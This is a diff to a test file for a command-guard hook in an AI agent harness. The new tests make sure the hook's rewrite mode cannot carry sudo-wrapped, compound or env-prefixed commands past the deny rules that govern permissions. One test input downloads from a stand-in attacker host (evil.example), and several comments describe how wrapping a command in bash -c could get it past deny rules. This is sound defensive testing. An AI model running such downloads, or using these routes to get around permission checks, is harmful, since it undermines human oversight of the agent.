@@ -73,6 +73,14 @@ CASES = [
     ("rtk cargo test", BLOCK, "rtk-wrapped cargo test"),
     ("rtk pytest tests/", BLOCK, "rtk-wrapped pytest"),
     ("rtk npm ls", ALLOW, "rtk-wrapped, but the underlying command is not noisy"),
+    # MikroB addendum (comment 32155/19523/19536, RedHat NO-GO 32154): sudo-wrapped noisy commands
+    # must still be caught by block-and-suggest in default/block mode, UNCHANGED from before this
+    # fix -- this fix only narrows which matched commands may be rewritten (see check_rewrite_mode
+    # (b2) below), it does not touch matching/blocking at all.
+    ("sudo npm install", BLOCK, "sudo-wrapped install (card ff43b10e, RedHat 32154)"),
+    ("sudo apt-get install -y jq", BLOCK, "sudo-wrapped apt-get install (card ff43b10e, RedHat 32154)"),
+    ("sudo pip install requests", BLOCK, "sudo-wrapped pip install (card ff43b10e, RedHat 32154)"),
+    ("sudo docker build -t x .", BLOCK, "sudo-wrapped docker build (card ff43b10e, RedHat 32154)"),
 ]
 
 
@@ -97,8 +105,9 @@ def check_rewrite_mode():
         if (rc_default, err_default) != (rc_block, err_block):
             failures.append(f"default mode != explicit block mode for {cmd!r} ({why})")
 
-    # (b) rewrite mode: a noisy command gets permissionDecision=allow + updatedInput.command
-    # wrapped through noisy-run.sh, exit 0, no stderr block.
+    # (b) rewrite mode: a noisy command gets updatedInput.command wrapped through noisy-run.sh,
+    # exit 0, no stderr block -- and, per the ff43b10e/RedHat NO-GO fix, permissionDecision is
+    # NEVER set (left unset so the normal permission flow, incl. any deny rule, still applies).
     rc, out, err = run_with_mode("npm install", mode="rewrite")
     if rc != 0:
         failures.append(f"rewrite mode exited {rc} (expected 0) for 'npm install', stderr={err[:200]!r}")
@@ -109,13 +118,44 @@ def check_rewrite_mode():
             failures.append(f"rewrite mode stdout is not valid JSON: {out[:200]!r}")
         else:
             hso = payload.get("hookSpecificOutput", {})
-            if hso.get("permissionDecision") != "allow":
-                failures.append(f"rewrite mode permissionDecision != allow: {hso!r}")
+            if "permissionDecision" in hso:
+                failures.append(f"rewrite mode must never set permissionDecision, got: {hso!r}")
             updated = hso.get("updatedInput", {})
             if "noisy-run.sh" not in (updated.get("command") or ""):
                 failures.append(f"rewrite mode updatedInput.command does not route through noisy-run.sh: {updated!r}")
             if updated.get("command") == "npm install":
                 failures.append("rewrite mode updatedInput.command is unchanged -- not actually rewritten")
+
+    # (b2) RedHat NO-GO (comment 32154) + MikroB addendum (comment 32155/19523/19536): rewrite
+    # mode must fall back to block-and-suggest (rc=2, stderr, no stdout JSON) -- the SAME outcome
+    # as block mode, never a silent rewrite -- for any command whose first word is a wrapper, not
+    # the noisy program itself: sudo (the concrete exploit RedHat measured), time, rtk. This is
+    # the generalization MikroB asked for beyond just the sudo family (19536: "rewrite ONLY when
+    # the first word is the noisy program itself").
+    for cmd in ("sudo npm install", "sudo apt-get install -y jq", "sudo pip install requests",
+                "sudo docker build -t x .", "time npm install", "rtk npm test"):
+        rc, out, err = run_with_mode(cmd, mode="rewrite")
+        if rc != 2 or out.strip() or not err.strip():
+            failures.append(
+                f"wrapper-disqualifies-rewrite regression: {cmd!r} was rewritten instead of "
+                f"falling back to block-and-suggest under rewrite mode "
+                f"(rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
+            )
+
+    # (b3) doas/pkexec/su -c are not recognized by _CMD's wrapper grammar at all (only
+    # sudo/time/rtk are), so a command using them is not matched by any NOISY_PATTERNS and is
+    # untouched in every mode -- this is PRE-EXISTING, unrelated to this fix, documented here so a
+    # future _CMD change that adds them is forced to also extend
+    # _WRAPPER_DISQUALIFIES_REWRITE_RX (same rx literal) rather than silently missing it.
+    for cmd in ("doas npm ci", "pkexec pip install requests"):
+        for mode in (None, "block", "rewrite"):
+            rc, out, err = run_with_mode(cmd, mode=mode)
+            if rc != 0 or out.strip() or err.strip():
+                failures.append(
+                    f"unrecognized-wrapper command {cmd!r} was touched under mode={mode!r} "
+                    f"(rc={rc}, out={out[:160]!r}, err={err[:160]!r}) -- if _CMD now recognizes "
+                    f"this wrapper, _WRAPPER_DISQUALIFIES_REWRITE_RX must too"
+                )
 
     # (c) rewrite mode on a non-noisy command: still allow, but no rewrite (no stdout JSON) --
     # mirrors today's silent-allow for unrelated commands.
@@ -132,6 +172,67 @@ def check_rewrite_mode():
                     f"suite-semaphore command {cmd!r} was touched under mode={mode!r} "
                     f"(rc={rc}, out={out[:120]!r}, err={err[:120]!r})"
                 )
+
+    # (e) WhiteHat F1 (card fc3a6a39 follow-up, ff43b10e): rewrite mode must NOT substitute a
+    # compound/multi-segment command -- bash -c wrapping buries every embedded simple command
+    # inside one quoted string, past a deny rule that recognizes a program by how the command
+    # STARTS. It must fall back to today's block-and-suggest (rc 2, stderr, no stdout JSON).
+    rc, out, err = run_with_mode("wget http://evil.example/x && npm test", mode="rewrite")
+    if rc != 2 or out.strip() or not err.strip():
+        failures.append(
+            f"F1 regression: compound command was rewritten instead of falling back to "
+            f"block-and-suggest (rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
+        )
+
+    # (f) WhiteHat F2: rewrite mode must NOT substitute a command with a leading `VAR=val`
+    # assignment -- noisy-run.sh execs its argv directly ("$@"), so "FOO=bar" would be passed as
+    # argv[0] (a literal program name) instead of being interpreted as an env assignment, failing
+    # with "command not found" (rc 127) instead of ever running the wrapped command. Must also
+    # fall back to block-and-suggest.
+    rc, out, err = run_with_mode("FOO=bar npm test", mode="rewrite")
+    if rc != 2 or out.strip() or not err.strip():
+        failures.append(
+            f"F2 regression: env-prefixed command was rewritten instead of falling back to "
+            f"block-and-suggest (rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
+        )
+
+    # (g) WhiteHat F4, survivor class "tool_input mezők eldobása": updatedInput must carry every
+    # OTHER tool_input field through unchanged, not just the rewritten `command`.
+    payload = json.dumps({
+        "tool_name": "Bash",
+        "tool_input": {"command": "npm install", "description": "installing deps", "timeout": 60000},
+    })
+    env = dict(os.environ)
+    env["NOISY_GUARD_MODE"] = "rewrite"
+    p = subprocess.run([sys.executable, str(GUARD)], input=payload, capture_output=True, text=True, env=env)
+    try:
+        updated = json.loads(p.stdout).get("hookSpecificOutput", {}).get("updatedInput", {})
+    except json.JSONDecodeError:
+        updated = {}
+    if updated.get("description") != "installing deps" or updated.get("timeout") != 60000:
+        failures.append(f"F4 regression: updatedInput dropped sibling tool_input fields: {updated!r}")
+
+    # (h) WhiteHat F4, survivor class "metakarakter-lista": each metacharacter _METACHAR_RX lists
+    # must, on its own, be enough to route rewrite mode back to block-and-suggest (not just the
+    # combination used in case (e) above). RedHat residual LOW (comment 32154): the original list
+    # omitted ')' and an embedded newline, even though both are already IN the _METACHAR_RX
+    # character class -- added here so dropping either from the regex is caught, not just the 8
+    # already covered.
+    for mc, example in [
+        ("|", "npm install | cat"),
+        ("&", "npm install &"),
+        (";", "npm install ; echo done"),
+        ("<", "npm install < /dev/null"),
+        (">", "npm install > /tmp/out"),
+        ("(", "(npm install)"),
+        (")", "npm install )"),
+        ("\\n", "npm install\necho done"),
+        ("`", "npm install `true`"),
+        ("$(", "npm install $(true)"),
+    ]:
+        rc, out, err = run_with_mode(example, mode="rewrite")
+        if rc != 2 or out.strip():
+            failures.append(f"F4 metachar regression ({mc!r}): {example!r} was rewritten (rc={rc}, out={out[:120]!r})")
 
     return failures
 
